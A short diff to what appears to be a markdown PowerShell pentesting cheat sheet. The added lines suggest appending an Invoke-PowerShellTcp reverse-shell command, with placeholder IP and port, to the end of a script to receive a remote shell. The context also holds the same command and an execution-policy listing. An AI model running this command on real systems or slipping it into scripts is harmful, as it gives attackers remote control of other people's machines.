@@ -63,6 +63,10 @@ Invoke-PowerShellTcp -Reverse -IPAddress IP -Port PORT
 
 # List Execution Policy Rules
 Get-ExecutionPolicy -List | Format-Table -AutoSize
+
+
+# It is also possible to Append at the end of the Script this command to Receive the Reverse Shell
+Invoke-PowerShellTcp -Reverse -IPAddress IP -Port PORT
 ```
 
 </div>
